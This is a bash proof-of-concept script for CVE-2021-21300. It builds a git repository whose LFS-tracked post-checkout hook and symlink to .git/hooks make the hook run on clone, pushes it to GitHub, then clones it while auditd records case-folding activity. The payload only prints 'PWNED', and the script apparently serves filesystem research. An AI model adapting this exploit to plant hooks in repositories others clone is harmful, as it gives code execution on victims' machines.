#!/bin/bash
# --------------
# CVE-2021-21300
# --------------
# Run script from case-insensitive file system
# 
# Install git-lfs:
# go get github.com/git-lfs/git-lfs
# 
# POC from: https://www.openwall.com/lists/oss-security/2021/03/09/3

# Point to local git installation
export PATH=/home/mitthu/repos/git:$PATH
git config --global init.templatedir /usr/share/git-core/templates
#git config --global init.templatedir --unset-all

trace_start() {
	# remove old logs
	sudo rm -f /var/log/audit/*
	rm -f logs.auditd

	# rotate log & add rules
	sudo service auditd rotate
	sudo auditctl -w /mercury/research/casefolding -k icase
}

trace_end() {
	# delete rules
	sudo auditctl -D
	sudo service auditd rotate

	# get a copy of all logs
	sudo ausearch -k icase | tee logs.auditd >/dev/null
}

sanity_checks() {
	# git binary check
	git=$(which git)
	if [[ ! -f $git ]]; then
		echo "Requires git" && exit 1
	fi

	# git version check
	ver=$(git version | cut -f3 -d\ )
	major=$(echo $ver | cut -f1 -d.)
	minor=$(echo $ver | cut -f2 -d.)
	patch=$(echo $ver | cut -f3 -d.)
	errmsg="Requires git version >=2.15.0 and <=2.30.1 (detected $ver)"

	if [[ $major -ge 2 ]] && [[ $minor -ge 15 ]] && [[ $patch -ge 0 ]]; then
		true # okay
	else
		echo $errmsg && exit 1
	fi
	
	if [[ $major -le 2 ]] && [[ $minor -le 30 ]] && [[ $patch -le 1 ]]; then
		true # okay
	else
		echo $errmsg && exit 1
	fi

	# git-lfs binary check 
	gitlfs=$(which git-lfs)
	if [[ ! -f $gitlfs ]]; then
		echo "Requires git-lfs" && exit 1
	fi
}

cleanup() {
	rm -rf delayed-checkout cloned
} 

# Sanity checks
sanity_checks
cleanup

# Exploit (run inside case insensitive file system)
git init delayed-checkout &&
(
	cd delayed-checkout &&
	git config user.name "Your Name" &&
	git config user.email "you@example.com" &&
	git lfs track "A/post-checkout" && # echo "A/post-checkout filter=lfs diff=lfs merge=lfs" >.gitattributes \ &&
	mkdir A &&
	printf '#!/bin/sh\n\necho PWNED >&2\n' >A/post-checkout &&
	chmod +x A/post-checkout &&
	>A/a &&
	>A/b &&
	git add -A &&
	rm -rf A &&
	ln -s .git/hooks a &&
	git add a &&
	git commit -m initial &&
	git remote add origin git@github.com:mitthu/tmp.git &&
	git push -u origin -f master
) &&


trace_start

git clone git@github.com:mitthu/tmp.git cloned

# The following fail:
# git clone --shared file://`pwd`/delayed-checkout/.git cloned
# git clone --reference delayed-checkout delayed-checkout cloned

trace_end
